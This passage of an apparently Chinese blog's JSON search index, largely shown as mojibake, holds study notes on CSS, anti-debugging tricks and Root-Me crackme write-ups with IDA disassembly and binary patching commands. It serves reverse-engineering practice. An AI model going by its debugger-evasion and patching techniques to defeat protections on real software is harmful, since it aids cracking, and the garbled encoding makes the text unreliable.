å¯åœ¨æ®µè½ä¸­è¿›è¡Œæ¢è¡Œ&lt;hr&gt; å…ƒç´ åœ¨æ–‡æ¡£ä¸­ç”Ÿæˆä¸€æ¡æ°´å¹³åˆ†å‰²çº¿ &lt;iframe&gt;å…ƒç´ æ—¨åœ¨å…è®¸æ‚¨å°†å…¶ä»–Webæ–‡æ¡£åµŒå…¥åˆ°å½“å‰æ–‡æ¡£ä¸­ CSSç»™ HTML å…ƒç´ åŠ ä¸ªç±»åï¼ˆclassï¼‰ï¼Œåœ¨ CSS ä¸­å†é€‰ä¸­é‚£ä¸ªç±»å123456&lt;li class=\"special\"&gt;cssä¸­.special &#123; color: orange; font-weight: bold;&#125; é€‰æ‹©å™¨é‡è¦ï¼šï¼šé€‰æ‹©åµŒå¥—åœ¨&lt;li&gt; å…ƒç´ å†…çš„&lt;em&gt;æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç§°ä¸ºåŒ…å«é€‰æ‹©ç¬¦çš„é€‰æ‹©å™¨ï¼Œå®ƒåªæ˜¯å•çº¯åœ°åœ¨ä¸¤ä¸ªé€‰æ‹©å™¨ä¹‹é—´åŠ ä¸Šä¸€ä¸ªç©ºæ ¼ 123li em &#123; color: rebeccapurple;&#125; è®¾ç½®ç›´æ¥å‡ºç°åœ¨æ ‡é¢˜åé¢å¹¶ä¸”ä¸æ ‡é¢˜å…·æœ‰ç›¸åŒå±‚çº§çš„æ®µè½æ ·å¼ï¼Œä¸ºæ­¤éœ€åœ¨ä¸¤ä¸ªé€‰æ‹©å™¨ä¹‹é—´æ·»åŠ ä¸€ä¸ª + å· (æˆä¸º ç›¸é‚»é€‰æ‹©ç¬¦) æ ¹æ®çŠ¶æ€ç¡®å®šæ ·å¼ a:link a:hover article p span { ... } h1 + ul + p { ... } 12body h1 + p .special &#123;åœ¨&lt;body&gt;ä¹‹å†…ï¼Œç´§æ¥åœ¨&lt;h1&gt;åé¢çš„&lt;p&gt;å…ƒç´ çš„å†…éƒ¨ï¼Œç±»åä¸ºspecialã€‚ csså±æ€§12345font-sizewidthbackground-colorcolorborder calc()å‡½æ•° è¿›è¡Œç®€å•è®¡ç®—rotate() é¢å¤–æ ·å¼è¡¨å°†é¢å¤–çš„æ ·å¼è¡¨å¯¼å…¥ä¸»CSSæ ·å¼è¡¨ï¼Œå¯ä»¥ä½¿ç”¨@import:@import &#39;styles2.css&#39;; è§„åˆ™åº”ç”¨ä¸¤æ¡åŒçº§åˆ«çš„è§„åˆ™ï¼ˆç›¸åŒè§„åˆ™ï¼‰ç†è§£ä¸ºåé¢çš„è§„åˆ™è¦†ç›–å‰é¢çš„è§„åˆ™ æœ‰ä¸åŒé€‰æ‹©å™¨å¯¹åº”ç›¸åŒçš„å…ƒç´ çš„æ—¶å€™éœ€è¦ä½¿ç”¨å“ªä¸ªè§„åˆ™ä¸€ä¸ªå…ƒç´ é€‰æ‹©å™¨æ¯”ç±»é€‰æ‹©å™¨çš„ä¼˜å…ˆçº§æ›´ä½ä¼šè¢«å…¶è¦†ç›– 1234åƒä½ï¼š å¦‚æœå£°æ˜åœ¨ style çš„å±æ€§ï¼ˆå†…è”æ ·å¼ï¼‰åˆ™è¯¥ä½å¾—ä¸€åˆ†ã€‚è¿™æ ·çš„å£°æ˜æ²¡æœ‰é€‰æ‹©å™¨ï¼Œæ‰€ä»¥å®ƒå¾—åˆ†æ€»æ˜¯1000ã€‚ç™¾ä½ï¼š é€‰æ‹©å™¨ä¸­åŒ…å«IDé€‰æ‹©å™¨åˆ™è¯¥ä½å¾—ä¸€åˆ†ã€‚åä½ï¼š é€‰æ‹©å™¨ä¸­åŒ…å«ç±»é€‰æ‹©å™¨ã€å±æ€§é€‰æ‹©å™¨æˆ–è€…ä¼ªç±»åˆ™è¯¥ä½å¾—ä¸€åˆ†ã€‚ä¸ªä½ï¼šé€‰æ‹©å™¨ä¸­åŒ…å«å…ƒç´ ã€ä¼ªå…ƒç´ é€‰æ‹©å™¨åˆ™è¯¥ä½å¾—ä¸€åˆ†ã€‚ class id1234&lt;div id=\"outer\" class=\"container\"&gt;#outer a &#123; background-color: red;&#125; id å¯¹åº”#outerclasså¯¹åº”.container ç›’å­12345æ ‡é¢˜(&lt;h1&gt;ç­‰)å’Œæ®µè½(&lt;p&gt;)é»˜è®¤æƒ…å†µä¸‹éƒ½æ˜¯å—çº§çš„ç›’å­åšé“¾æ¥çš„ &lt;a&gt; å…ƒç´ ã€ &lt;span&gt;ã€ &lt;em&gt; ä»¥åŠ &lt;strong&gt; éƒ½æ˜¯é»˜è®¤å¤„äº inline çŠ¶æ€çš„ï¼œdivï¼å—çº§å…ƒç´ ç›’å­display å±æ€§çš„è®¾ç½®ï¼Œæ¯”å¦‚ inline æˆ–è€… block ï¼Œæ¥æ§åˆ¶ç›’å­çš„å¤–éƒ¨æ˜¾ç¤ºç±»å‹åœ¨æ ‡å‡†æ¨¡å‹ä¸­ï¼Œå¦‚æœä½ ç»™ç›’è®¾ç½® width å’Œ heightï¼Œå®é™…è®¾ç½®çš„æ˜¯ content box æ›¿ä»£ç›’æ¨¡å‹ï¼Œwidthå°±æ˜¯ç›’çš„å®½åº¦ï¼Œè€Œä¸æ˜¯contentçš„å®½åº¦123456html &#123; box-sizing: border-box;&#125;*, *::before, *::after &#123; box-sizing: inherit;&#125; æœ‰ä¸¤ä¸ªå¤–è¾¹è·ç›¸æ¥çš„å…ƒç´ ï¼Œè¿™äº›å¤–è¾¹è·å°†åˆå¹¶ä¸ºä¸€ä¸ªå¤–è¾¹è·ï¼Œå³æœ€å¤§çš„å•ä¸ªå¤–è¾¹è·çš„å¤§å° inline-blockå…ƒç´ ä½¿ç”¨ display: inline-blockï¼Œå®ç°æˆ‘ä»¬éœ€è¦çš„å—çº§çš„éƒ¨åˆ†æ•ˆæœï¼š è®¾ç½®width å’Œheight å±æ€§ä¼šç”Ÿæ•ˆã€‚padding, margin, ä»¥åŠborder ä¼šæ¨å¼€å…¶ä»–å…ƒç´ ã€‚ èƒŒæ™¯å›¾åƒé»˜è®¤æƒ…å†µä¸‹ï¼Œå¤§å›¾ä¸ä¼šç¼©å°ä»¥é€‚åº”æ–¹æ¡†ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½çœ‹åˆ°å®ƒçš„ä¸€ä¸ªå°è§’ï¼Œè€Œå°å›¾åˆ™æ˜¯å¹³é“ºä»¥å¡«å……æ–¹æ¡† background-repeatå±æ€§ç”¨äºæ§åˆ¶å›¾åƒçš„å¹³é“ºè¡Œä¸º background-sizeå±æ€§ï¼Œå®ƒå¯ä»¥è®¾ç½®é•¿åº¦æˆ–ç™¾åˆ†æ¯”å€¼ï¼Œæ¥è°ƒæ•´å›¾åƒçš„å¤§å°ä»¥é€‚åº”èƒŒæ™¯ èƒŒæ™¯æ˜¯æŒ‡å®šä»–ä»¬å¦‚ä½•æ»šåŠ¨æ—¶ï¼Œå†…å®¹æ»šåŠ¨ã€‚è¿™æ˜¯ç”±background-attachmentå±æ€§æ§åˆ¶çš„ border-radiuså±æ€§å’Œä¸æ–¹æ¡†çš„æ¯ä¸ªè§’ç›¸å…³çš„é•¿è¾¹æ¥å®ç°æ–¹æ¡†çš„åœ†è§’ background-color:rgba(0,0,0,.5);RGBAé¢œè‰² ç¬¬å››ä¸ªå€¼è¡¨ç¤ºé¢œè‰²çš„alphaé€šé“ï¼Œå®ƒæ§åˆ¶ä¸é€æ˜åº¦ã€‚å¦‚æœå°†è¿™ä¸ªå€¼è®¾ç½®ä¸º0ï¼Œå®ƒå°†ä½¿é¢œè‰²å®Œå…¨é€æ˜åŠé€æ˜çš„é»‘è‰²èƒŒæ™¯é¢œè‰² æº¢å‡º12345overflowå±æ€§overflow: hidden éšè—æ‰æº¢å‡ºoverflow: scroll ä½ çš„æµè§ˆå™¨æ€»ä¼šæ˜¾ç¤ºæ»šåŠ¨æ¡overflow-x ï¼ï½™overflow: auto ç»å¯¹é•¿åº¦å•ä½px åƒç´  ï¼1/96ï½ƒï½ ç›¸å¯¹é•¿åº¦å•ä½em åœ¨ font-size ä¸­ä½¿ç”¨æ˜¯ç›¸å¯¹äºçˆ¶å…ƒç´ çš„å­—ä½“å¤§å°ï¼Œåœ¨å…¶ä»–å±æ€§ä¸­ä½¿ç”¨æ˜¯ç›¸å¯¹äºè‡ªèº«çš„å­—ä½“å¤§å°ï¼Œå¦‚ width æ€»æ˜¯æƒ³è®©å®ƒè‡³å°‘æœ‰ä¸ªç¡®å®šçš„é«˜åº¦ï¼Œä½ åº”è¯¥ç»™å®ƒè®¾ç½®ä¸€ä¸ªmin-heightå±æ€§ å›¾ç‰‡æº¢å‡ºä¸€å¼ å›¾ç‰‡çš„max-widthè®¾ä¸º100%ã€‚maxï¼width:100%æŒ‡çš„æ˜¯çˆ¶å®¹å™¨å®½åº¦çš„ç™¾åˆ†æ•°æŠ€æœ¯æ˜¯ç”¨æ¥è®©å›¾ç‰‡å¯å“åº”çš„ï¼Œæ‰€ä»¥åœ¨æ›´å°çš„è®¾å¤‡ä¸Šæµè§ˆçš„æ—¶å€™ï¼Œå®ƒä»¬ä¼šåˆé€‚åœ°ç¼©æ”¾ï¼Œä½†ä¼šå…ˆåŠ è½½å¤§çš„å›¾åƒï¼Œåœ¨ç¼©æ”¾ ä¸»é¡µcargo-generate","categories":[],"tags":[{"name":"FRONT-END","slug":"FRONT-END","permalink":"http://finsenty54.github.io/tags/FRONT-END/"}]},{"title":"nice try","slug":"nice_try","date":"2020-10-27T07:34:42.000Z","updated":"2020-10-27T07:35:25.612Z","comments":true,"path":"2020/10/27/nice_try/","link":"","permalink":"http://finsenty54.github.io/2020/10/27/nice_try/","excerpt":"&lt;é€†å‘å·¥ç¨‹-æ ¸å¿ƒåŸç†&gt;ç»ˆç»“çœ‹äº†ä¸¤ä¸‰å¹´ï¼Œç»ˆäºçœ‹å®Œäº†ï¼Œnice try2020-10-27 15:20:20 æ˜ŸæœŸäºŒ :tw-1f4aa: æ¥ä¸‹æ¥çš„æ˜¯é˜…è¯»è¿‡ç¨‹ä¸­çš„ä¸€äº›ç¬”è®°","text":"&lt;é€†å‘å·¥ç¨‹-æ ¸å¿ƒåŸç†&gt;ç»ˆç»“çœ‹äº†ä¸¤ä¸‰å¹´ï¼Œç»ˆäºçœ‹å®Œäº†ï¼Œnice try2020-10-27 15:20:20 æ˜ŸæœŸäºŒ :tw-1f4aa: æ¥ä¸‹æ¥çš„æ˜¯é˜…è¯»è¿‡ç¨‹ä¸­çš„ä¸€äº›ç¬”è®° å†…æ ¸è°ƒè¯•ç»ˆç«¯ä¸­è¾“å…¥ bcdedit -debug onå¼€å¯å†…æ ¸è°ƒè¯•æ¨¡å¼ WINDBGlkd&gt; u nt!ZwCreateFile L50 æŸ¥çœ‹createfile ä»£ç u åæ±‡ç¼– u L10æ˜¾ç¤º10è¡Œå‘½ä»¤ dbå‘½ä»¤d-display åˆ é™¤ASLRåŠŸèƒ½å°†é€‰æ‹©å¤´ä¸­çš„DLL Characteristicsä¸­DYNAMIC_BASEæ ‡å¿—åˆ é™¤å³å¯ TLSå›è°ƒå‡½æ•°é•¿ç”¨äºåè°ƒè¯•ç±»ä¼¼äºlinux ptrace()å‡½æ•° æ¯å½“åˆ›å»º/ç»ˆæ­¢è¿›ç¨‹çš„çº¿ç¨‹æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨æ‰§è¡Œçš„å‡½æ•°ã€‚åˆ›å»ºè¿›ç¨‹çš„ä¸»çº¿ç¨‹ä¼šå…ˆäºEPä»£ç ï¼Œè°ƒç”¨å›è°ƒå‡½æ•° åœ¨é€‰æ‹©å¤´ä¸­æœ‰TLSè¡¨åœ°å€ï¼Œé‡Œé¢æ˜¯tlsç»“æ„ä½“çš„åœ°å€ï¼Œå¯èƒ½æœ‰å¤šä¸ªç»“æ„ä½“ï¼Œaddress of callbacksæˆå‘˜æŒ‡å‘tlså‡½æ•°åœ°å€ isDebuggerPersent()æ£€æŸ¥peb.deingdebuggedå€¼ï¼Œ+02å¤„åˆ¤æ–­æ˜¯å¦å¤„äºè°ƒè¯• getmodulehandle()è·å–è¿›ç¨‹imagebase windbg é…ç½®ç¬¦å·è¡¨srv*https://msdl.microsoft.com/download/symbolsé€šçŸ¥ WinDbg è¿›è¡Œç¬¦å·æ–‡ä»¶çš„åˆå§‹æŸ¥æ‰¾å’ŒåŠ è½½ï¼š.reloadLm æŸ¥çœ‹å·²åŠ è½½æ¨¡å— dtdisplays information about a local variable, global variable or data type dt _tebdt _pebdt _peb_ldr_data PEBæ¨¡å—=dllåŠ è½½åï¼Œé€šè¿‡PEB.ldr ç›´æ¥è·å–è¯¥æ¨¡å—çš„åŠ è½½åŸºåœ°å€ FS:[0] TEBèµ·å§‹åœ°å€ FS:[30] PEBèµ·å§‹åœ°å€ åˆ©ç”¨SEHæœºåˆ¶çš„åè°ƒè¯•æŠ€æœ¯ç¨‹åºåœ¨æ­£å¸¸è¿è¡Œå’Œè°ƒè¯•è¿è¡Œæ—¶è¡¨ç°å‡ºçš„è¡Œä¸ºåŠ¨ä½œæ˜¯ä¸åŒçš„æ­£å¸¸ï¼šç¨‹åºè‡ªå·±å¤„ç†è°ƒè¯•æ—¶ï¼šæŠ›ç»™è°ƒè¯•å™¨å¤„ç† é€šè¿‡TEB.NtTib.ExceptionListæ‰¾åˆ°SEHé“¾ TEB.NtTib.ExceptionList =FSï¼š[0] ç»“æ„ä½“ æ„æˆé“¾ * next_seh * handler esp+c å³æŒ‡å‘ pContextsehå‡½æ•°å‚æ•°ç¬¬ä¸‰ä¸ªä¸ºæŒ‡å‘pContextçš„æŒ‡é’ˆï¼Œä¿å­˜çº¿ç¨‹å¯„å­˜å™¨å€¼ï¼Œæ‰§è¡Œå…¶ä»–è¿›ç¨‹å°±ä¼šä¿å­˜å¯„å­˜å™¨å€¼ã€‚*pContext+B8(32ä½ä¸‹ï¼‰ä¸ºEIPå€¼ï¼Œ ä¿®æ”¹EIPï¼Œæ”¹å˜æ‰§è¡Œæµç¨‹ä¸€æ ·ï¼Œé€šè¿‡PEB.isdebuggerpersent()API å–å¾—beingDebuggedå€¼åˆ¤æ–­ ä¿æŠ¤å™¨ï¼Œå‹ç¼©å™¨ åè°ƒè¯•â€“ä¸€ä¸ªæ›´ç®€å•ï¼Œæ›´å¥½çš„æ–¹æ³•ï¼šåˆ¤æ–­å½“å‰ç³»ç»Ÿæ˜¯å¦æ˜¯ä¸ºé€†å‘åˆ†æä¸“ç”¨ç³»ç»Ÿ findWindow() , createTOOLhelp32SnapsHOT() , GETcomputerName() OllyDBG view-seh chainPEB.ImageBase ä¿å­˜è¿›ç¨‹çš„å®é™…æ˜ å°„åœ°å€ debug blocker è¢«è°ƒè¯•è¿›ç¨‹ä¸èƒ½è¢«å…¶ä»–è¿›ç¨‹è°ƒè¯• è°ƒè¯•å™¨æ“ä½œè¢«è°ƒè¯•è€…çš„ä»£ç  è°ƒè¯•å™¨å¤„ç†è¢«è°ƒè¯•è¿›ç¨‹ä¸­å‘ç”Ÿçš„å¼‚å¸¸ clbpollydgbçš„æ¡ä»¶è®°å½•æ–­ç‚¹ctrl+G å°†å…‰æ ‡ç§»åˆ°4011f0åœ°å€åï¼ŒæŒ‰shift+f4ï¼Œæ‰“å¼€è®¾ç½®CLBPå¯¹è¯æ¡†ï¼ˆæ¡ä»¶æ–­ç‚¹ï¼‰ detach åˆ†ç¦» EB FE æ— é™å¾ªç¯ DebugActiveProcessStop()å°†è¢«è°ƒè¯•è€…ä»è°ƒè¯•å™¨ä¸­åˆ†ç¦»å‡ºæ¥","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"ELF_x64_Nanomites_Introduction","slug":"ELF_x64_Nanomites_Introduction","date":"2020-10-26T02:08:58.000Z","updated":"2020-10-26T02:12:52.564Z","comments":true,"path":"2020/10/26/ELF_x64_Nanomites_Introduction/","link":"","permalink":"http://finsenty54.github.io/2020/10/26/ELF_x64_Nanomites_Introduction/","excerpt":"ELF x64 - Nanomites - Introductionmmapmmapåªæ˜¯åœ¨è™šæ‹Ÿå†…å­˜åˆ†é…äº†åœ°å€ç©ºé—´ï¼Œåªæœ‰åœ¨ç¬¬ä¸€æ¬¡è®¿é—®è™šæ‹Ÿå†…å­˜çš„æ—¶å€™æ‰åˆ†é…ç‰©ç†å†…å­˜ã€‚ void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);","text":"ELF x64 - Nanomites - Introductionmmapmmapåªæ˜¯åœ¨è™šæ‹Ÿå†…å­˜åˆ†é…äº†åœ°å€ç©ºé—´ï¼Œåªæœ‰åœ¨ç¬¬ä¸€æ¬¡è®¿é—®è™šæ‹Ÿå†…å­˜çš„æ—¶å€™æ‰åˆ†é…ç‰©ç†å†…å­˜ã€‚ void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset); åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ä¸ºæ‰€è°ƒç”¨è¿›ç¨‹åˆ›å»ºä¸€ä¸ªæ–°çš„æ˜ å°„ã€‚å¼€å§‹åœ°å€ä¸ºaddrï¼Œé•¿åº¦ä¸ºlengthå†…æ ¸åœ¨é è¿‘é¡µè¾¹ç•Œçš„åœ°æ–¹ï¼Œå°è¯•åˆ›å»ºã€‚å¦‚æœå·²æœ‰æ˜ å°„åœ¨æ­¤ï¼Œå°±ä¸ç”¨addrï¼Œä¼šè¿”å›æ–°åœ°å€ The contents of a file mapping(as opposed to an anonymous mapping; see MAP_ANONYMOUS below), are initialized using length bytes starting at offsetoffset in the file (or other object) referred to by the file descriptor fd. protå‚æ•°æè¿°æ‰€éœ€çš„å†…å­˜ä¿æŠ¤ The flags argument determines whether updates to the mapping are visible to other processes mapping the same region, and whether updates are carried through to the underlying file. mmap åœ¨è™šæ‹Ÿç©ºé—´ä¸­å¼€è¾Ÿä¸€æ®µç©ºé—´ï¼Œå½“è¦è¯»çš„æ—¶å€™ï¼Œå°†æ–‡ä»¶å†…å®¹åŠ è½½è¿›ç‰©ç†å†…å­˜ memcpyvoid * memcpy ( void * destination, const void * source, size_t num ); è¡¨ç¤ºå°†0x400ac0çš„141ä¸ªå­—èŠ‚æ‹·è´åˆ°æ–°å¼€è¾Ÿçš„è™šæ‹Ÿç©ºé—´ä¸­0x7ffff7ffb000 0x4008b6: mov rcx,QWORD PTR [rip+0x2007c3] # 0x601080rcx==0x3148c93148c03148 r2help xå‘½ä»¤ï¼šx/3uh 0x54320 è¡¨ç¤ºï¼Œä»å†…å­˜åœ°å€0x54320è¯»å–å†…å®¹ï¼Œhè¡¨ç¤ºä»¥åŒå­—èŠ‚ä¸ºä¸€ä¸ªå•ä½ï¼Œ3è¡¨ç¤ºè¾“å‡ºä¸‰ä¸ªå•ä½ï¼Œuè¡¨ç¤ºæŒ‰åå…­è¿›åˆ¶æ˜¾ç¤ºã€‚ gdb-peda$ x/141xb 0x400ac0 forkpid_t fork(void)forkç³»ç»Ÿè°ƒç”¨ç”¨äºåˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œç§°ä¸ºå­è¿›ç¨‹ï¼Œå®ƒä¸è¿›ç¨‹ï¼ˆç§°ä¸ºç³»ç»Ÿè°ƒç”¨forkçš„è¿›ç¨‹ï¼‰åŒæ—¶è¿è¡Œï¼Œæ­¤è¿›ç¨‹ç§°ä¸ºçˆ¶è¿›ç¨‹ã€‚åˆ›å»ºæ–°çš„å­è¿›ç¨‹åï¼Œä¸¤ä¸ªè¿›ç¨‹å°†æ‰§è¡Œforkï¼ˆï¼‰ç³»ç»Ÿè°ƒç”¨ä¹‹åçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚ è¿”å›å€¼ï¼š è‹¥æˆåŠŸè°ƒç”¨ä¸€æ¬¡åˆ™è¿”å›ä¸¤ä¸ªå€¼ï¼Œå­è¿›ç¨‹è¿”å›0ï¼Œçˆ¶è¿›ç¨‹è¿”å›å­è¿›ç¨‹IDï¼›å¦åˆ™ï¼Œå‡ºé”™è¿”å›-1 è¿™æ„å‘³ç€çˆ¶å­è¿›ç¨‹é—´ä¸å…±äº«è¿™äº›å­˜å‚¨ç©ºé—´ã€‚ 0x4008d1: call 0x400630 &lt;fork@plt&gt; è°ƒç”¨åè¿”å›0ï¼Œ åˆ™å½“å‰çš„å­è¿›ç¨‹ gdb catch æ•è·å¼‚å¸¸ waitpidä½œç”¨åŒäºwaitï¼Œä½†å¯æŒ‡å®špidè¿›ç¨‹æ¸…ç†ï¼Œå¯ä»¥ä¸é˜»å¡ã€‚ pid_t waitpid(pid_t pid,int *status,int options);æˆåŠŸï¼šè¿”å›æ¸…ç†æ‰çš„å­è¿›ç¨‹IDï¼›å¤±è´¥ï¼š-1ï¼ˆæ— å­è¿›ç¨‹ï¼‰ pid&gt;0 åªç­‰å¾…è¿›ç¨‹IDç­‰äºpidçš„å­è¿›ç¨‹ï¼Œä¸ç®¡å…¶å®ƒå·²ç»æœ‰å¤šå°‘å­è¿›ç¨‹è¿è¡Œç»“æŸé€€å‡ºäº†ï¼Œåªè¦æŒ‡å®šçš„å­è¿›ç¨‹è¿˜æ²¡æœ‰ç»“æŸï¼Œwaitpidå°±ä¼šä¸€ç›´ç­‰ä¸‹å»ã€‚ å‚æ•°statuså¦‚æœä¸æ˜¯ä¸€ä¸ªç©ºæŒ‡é’ˆ,åˆ™ç»ˆæ­¢è¿›ç¨‹çš„ç»ˆæ­¢çŠ¶æ€å°±å­˜æ”¾åœ¨statusæ‰€æŒ‡å‘çš„å•å…ƒã€‚ SARSAR ç®—æœ¯å³ç§»æŒ‡ä»¤ç¬¦å·ä½ä¿æŒä¸å˜ call rax å¦‚æœéƒ½ä¸è·³è½¬ï¼Œåˆ™åˆ°è¿™é‡Œ0x7ffff7ffb07b: mov al,0x3c 0x7ffff7ffb07d: mov edi,0x0 0x7ffff7ffb082: syscall æ²¡æœ‰è§£å‡ºæ¥:tw-1f198::worried:","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"ELF x86 - Anti-debug","slug":"ELF x86 - Anti-debug","date":"2020-10-23T13:38:58.000Z","updated":"2020-10-23T13:39:43.618Z","comments":true,"path":"2020/10/23/ELF x86 - Anti-debug/","link":"","permalink":"http://finsenty54.github.io/2020/10/23/ELF x86 - Anti-debug/","excerpt":"ELF x86 - Anti-debugå‚è€ƒhttps://re.kv.io/crackme/12.htmlint 80 ç³»ç»Ÿè°ƒç”¨32ä½ä¸‹ï¼ŒEAXä¿å­˜è°ƒç”¨å·mov eax , 30 utime, utimes - change file last access and modification timesint utime(const char filename, const struct utimbuf times); The utime() system call changes the access and modification times ofthe inode specified by filename to the actime and modtime fields oftimes respectively.","text":"ELF x86 - Anti-debugå‚è€ƒhttps://re.kv.io/crackme/12.htmlint 80 ç³»ç»Ÿè°ƒç”¨32ä½ä¸‹ï¼ŒEAXä¿å­˜è°ƒç”¨å·mov eax , 30 utime, utimes - change file last access and modification timesint utime(const char filename, const struct utimbuf times); The utime() system call changes the access and modification times ofthe inode specified by filename to the actime and modtime fields oftimes respectively. ä¸Šé¢æ˜¯é”™çš„0x30 as sys_signal åå…­è¿›åˆ¶ ç›´æ¥å¼„é”™0x30 == 48 void (*signal(int sig, void (*func)(int)))(int) sys_signalè®¾ç½®ä¸€ä¸ªå‡½æ•°æ¥å¤„ç†ä¿¡å·ï¼Œå³å¸¦æœ‰ sig å‚æ•°çš„ä¿¡å·å¤„ç†ç¨‹åºsigâ€“ åœ¨ä¿¡å·å¤„ç†ç¨‹åºä¸­ä½œä¸ºå˜é‡ä½¿ç”¨çš„ä¿¡å·ç 0x5 ==SIGABRT (Signal Abort) ç¨‹åºå¼‚å¸¸ç»ˆæ­¢ã€‚func â€“ ä¸€ä¸ªæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆã€‚å®ƒå¯ä»¥æ˜¯ä¸€ä¸ªç”±ç¨‹åºå®šä¹‰çš„å‡½æ•° int3 would cause a debugger to stop12345678910111213.text:08048063 loc_8048063: ; CODE XREF: startâ†‘j.text:08048063 mov eax, 30h.text:08048068 mov ebx, 5.text:0804806D mov ecx, offset sub_80480E2.text:08048072 int 80h ; LINUX - sys_signal.text:08048074 jmp short loc_8048077.text:08048074 ; ---------------------------------------------------------------------------.text:08048076 db 0CEh.text:08048077 ; ---------------------------------------------------------------------------.text:08048077.text:08048077 loc_8048077: ; CODE XREF: start+14â†‘j.text:08048077 int 3 ; Trap to Debugger.text:08048078 jmp short loc_804807B å…ˆè®¾ç½®ç¬¬ä¸€ä¸ªsignalå¤„ç†å‡½æ•°ï¼Œåœ¨0x08048077å¤„é‡åˆ°int 3è·³åˆ°å¤„ç†å‡½æ•° 12345678910111213141516171819202122232425262728293031323334.text:080480E2.text:080480E2 sub_80480E2 proc near ; DATA XREF: start+Dâ†‘o.text:080480E2 mov eax, offset sub_8048104.text:080480E7 jmp short loc_8048101.text:080480E9 ; ---------------------------------------------------------------------------.text:080480E9.text:080480E9 loc_80480E9: ; CODE XREF: sub_80480E2:loc_80480FFâ†“j.text:080480E9 ; sub_80480E2:loc_8048101â†“j.text:080480E9 cmp eax, 80482E8h.text:080480EE jz short locret_8048103.text:080480F0 jmp short loc_80480F3.text:080480F0 ; ---------------------------------------------------------------------------.text:080480F2 db 0E8h.text:080480F3 ; ---------------------------------------------------------------------------.text:080480F3.text:080480F3 loc_80480F3: ; CODE XREF: sub_80480E2+Eâ†‘j.text:080480F3 xor dword ptr [eax], 8048FC1h.text:080480F9 add eax, 4.text:080480FC jmp short loc_80480FF.text:080480FC ; ---------------------------------------------------------------------------.text:080480FE db 0EBh.text:080480FF ; ---------------------------------------------------------------------------.text:080480FF.text:080480FF loc_80480FF: ; CODE XREF: sub_80480E2+1Aâ†‘j.text:080480FF jmp short loc_80480E9.text:08048101 ; ---------------------------------------------------------------------------.text:08048101.text:08048101 loc_8048101: ; CODE XREF: sub_80480E2+5â†‘j.text:08048101 jmp short loc_80480E9.text:08048103 ; ---------------------------------------------------------------------------.text:08048103.text:08048103 locret_8048103: ; CODE XREF: sub_80480E2+Câ†‘j.text:08048103 retn.text:08048103 sub_80480E2 endp å°†ä»£ç è§£å¯†å‡ºæ¥ï¼Œç„¶ååé¢æ ¹æ®signalæ‰§è¡Œå¤„ç†ä»£ç  1' '.join(map(lambda i: chr(i ^ 0xfc), [0xA5, 0xCF, 0x9D, 0xB4, 0xDD, 0x88, 0xB4, 0x95, 0xAF, 0x95, 0xAF, 0x88, 0xB4, 0xCF, 0x97, 0xB9, 0x85, 0xDD])) &#39; &#39;å­—ç¬¦ä¸²å†…ç½®å‡½æ•°join()map(fun, iter)å‡½æ•°funæ“ä½œiterç¬¬ä¸€ä¸ªå‚æ•° function ä»¥å‚æ•°åºåˆ—ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ è°ƒç”¨ function å‡½æ•°ï¼Œè¿”å›åŒ…å«æ¯æ¬¡ function å‡½æ•°è¿”å›å€¼çš„æ–°åˆ—è¡¨ã€‚lambda å£°æ˜ä¸ºåŒ¿åå‡½æ•°ï¼Œå¦‚ï¼š1map(lambda x: x ** 2, [1, 2, 3, 4, 5]) r2ï¼ˆä¸€ä¸ªå¤§ä½¬çš„è§£æ³•ï¼‰oo+ reopen in read-writewox 0xfc @ entry0+625!18 //ä¼šå†™å…¥ å°†0xfcä¸åé¢18ä¸ªå€¼å¼‚æˆ–wox [val] ^= xor (f.ex: wox 0x90)ps @ entry0+625ps print string wa nop write nopcode using asm.arch and asm.bits12[0x0804060]&gt; wa nop @ 0x08048077[0x0804060]&gt; wa mov ecx, 0x80482d1 @ 0x08048167 æ§åˆ¶ç¨‹åºæµç¨‹ sys_write âˆ’12345mov edx,4 ; message lengthmov ecx,msg ; message to writemov ebx,1 ; file descriptor (stdout)mov eax,4 ; system call number (sys_write)int 0x80 ; call kernel","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"é€†å‘_root_me_4","slug":"é€†å‘_root_me_4","date":"2020-10-19T02:09:51.000Z","updated":"2020-10-19T02:10:41.090Z","comments":true,"path":"2020/10/19/é€†å‘_root_me_4/","link":"","permalink":"http://finsenty54.github.io/2020/10/19/é€†å‘_root_me_4/","excerpt":"ELF â€” Random Crackmeå°†magicä¹‹å‰çš„å†…å®¹éƒ½åˆ é™¤ï¼Œå› ä¸ºä¹‹å‰çš„åƒåœ¾å†…å®¹ï¼Œä½¿å¾—ä¸èƒ½è¿è¡ŒELFæ–‡ä»¶ELF files start with 7f 45 4c 46","text":"ELF â€” Random Crackmeå°†magicä¹‹å‰çš„å†…å®¹éƒ½åˆ é™¤ï¼Œå› ä¸ºä¹‹å‰çš„åƒåœ¾å†…å®¹ï¼Œä½¿å¾—ä¸èƒ½è¿è¡ŒELFæ–‡ä»¶ELF files start with 7f 45 4c 46 r2 -ww ./ch3.bin-w open file in write modeww foobar write wide string â€˜f\\x00o\\x00o\\x00b\\x00a\\x00r\\x00â€™ wx 9090 write two intel nops [0x080482f0]&gt; wx eb @ 0x0804841A Short Jumpï¼ˆçŸ­è·³è½¬ï¼‰æœºå™¨ç  EB ç”¨time,randäº§ç”Ÿéšæœºå¯†ç gdb ç›´æ¥è®¾ç½®eip è·³è¿‡ä»£ç  set $eip=xxxx å†è¿è¡Œc binwalk crackme_wtf 1234r2aaaafl //list functions sym.main ELF x64 - Crackme automatingstr=â€break\\nâ€var4=0var8=0xf7(MOVSXD r64, r/m32 Move doubleword to quadword with sign-extension.è¿™æ˜¯64ä½ä»£ç 